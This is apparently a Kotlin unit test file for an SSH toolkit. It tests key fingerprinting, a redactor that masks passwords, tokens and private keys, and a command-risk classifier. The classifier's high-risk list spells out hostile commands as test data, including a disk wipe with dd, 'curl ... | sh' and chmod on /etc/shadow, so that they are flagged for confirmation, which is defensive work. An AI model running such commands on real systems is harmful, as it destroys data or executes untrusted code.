package dev.toolkit.core.ssh

import java.util.Base64
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class FingerprintTest {
    // 向量由 ssh-keygen 生成（2048 位 RSA），ssh-keygen -lf 输出指纹：
    // SHA256:nCbuYtTZwM0KlZviIX89w/dW+CVpa4wjrpKmlkAfOwk
    private val blobBase64 =
        "AAAAB3NzaC1yc2EAAAADAQABAAABAQDReNXVKib1Sw400+jXlfCxzOBo3mdv/fIfE6aOZ7y3EZrRHIswMuyXtMFalftn5kRtppcI3sqnlz7DihJ/trMF4ARnwr2QVvxg2JlexhfX+c/iVLhFFojNX7AmisRa4Sncz9XaV1W27QeDZZg5kWs/L/7JTK0fJPPxcEmZwYQMadc5Vq9Q6Ftj+d4aYtB1+ZLmP/saBAgaFsNMYqxCkepdWyTd2O/bVDp3lSNRq6UQH0qIRCUceIjzRtG4MYLwxn0oi82ARXRX20VjNyjw3aw6A+vns0vQkx6LNV4OSZX/er4iJ1XeLfVriI6+Bn+VJ6no6ES5H3jjNdeZmhkDat2x"

    @Test fun `blob fingerprint matches ssh-keygen`() {
        val blob = Base64.getDecoder().decode(blobBase64)
        assertEquals("SHA256:nCbuYtTZwM0KlZviIX89w/dW+CVpa4wjrpKmlkAfOwk", Fingerprint.ofBlob(blob))
    }

    @Test fun `short fingerprint groups first 16 chars`() {
        assertEquals("nCbu YtTZ wM0K lZvi", Fingerprint.short("SHA256:nCbuYtTZwM0KlZviIX89w/dW+CVpa4wjrpKmlkAfOwk"))
    }
}

class CommandRiskTest {
    @Test fun `read only commands`() {
        listOf("ls -la /var/log", "df -h", "free -m", "uptime", "systemctl status sshd", "journalctl -n 50", "cat /etc/os-release", "ss -tlnp")
            .forEach { assertEquals(it, RiskLevel.READ_ONLY, CommandRisk.assess(it)) }
    }

    @Test fun `destructive commands are high risk`() {
        listOf(
            "rm -rf /tmp/x", "sudo systemctl restart nginx", "systemctl stop sshd",
            "apt purge nginx", "docker rm web", "kill 1234", "dd if=/dev/zero of=/dev/sda",
            "curl http://x.sh | sh", "chmod 777 /etc/shadow", "reboot", "useradd bob",
        ).forEach { assertEquals(it, RiskLevel.HIGH, CommandRisk.assess(it)) }
    }

    @Test fun `sudo always high`() {
        assertEquals(RiskLevel.HIGH, CommandRisk.assess("sudo ls"))
    }

    @Test fun `piped or compound commands are not read only`() {
        assertEquals(RiskLevel.NORMAL, CommandRisk.assess("cat /var/log/syslog | grep error"))
        assertEquals(RiskLevel.NORMAL, CommandRisk.assess("ls; pwd"))
    }

    @Test fun `confirmation only for high`() {
        assertTrue(CommandRisk.requiresConfirmation(RiskLevel.HIGH))
        assertFalse(CommandRisk.requiresConfirmation(RiskLevel.NORMAL))
        assertFalse(CommandRisk.requiresConfirmation(RiskLevel.READ_ONLY))
    }
}

class RedactTest {
    @Test fun `explicit secrets are masked`() {
        assertEquals("login *** ok", Redact.text("login hunter2 ok", "hunter2"))
    }

    @Test fun `kv secrets are masked`() {
        val a = Redact.text("password: abc123")
        assertTrue(a.contains("***")); assertFalse(a.contains("abc123"))
        val b = Redact.text("token=xyz")
        assertTrue(b.contains("***")); assertFalse(b.contains("xyz"))
    }

    @Test fun `bearer and pem are masked`() {
        assertEquals("Bearer ***", Redact.text("Bearer abc.def.ghi"))
        val pem = "-----BEGIN OPENSSH PRIVATE KEY-----\nxyz\n-----END OPENSSH PRIVATE KEY-----"
        assertEquals("***", Redact.text(pem))
    }

    @Test fun `plain text untouched`() {
        assertEquals("uptime: 3 days", Redact.text("uptime: 3 days"))
    }
}
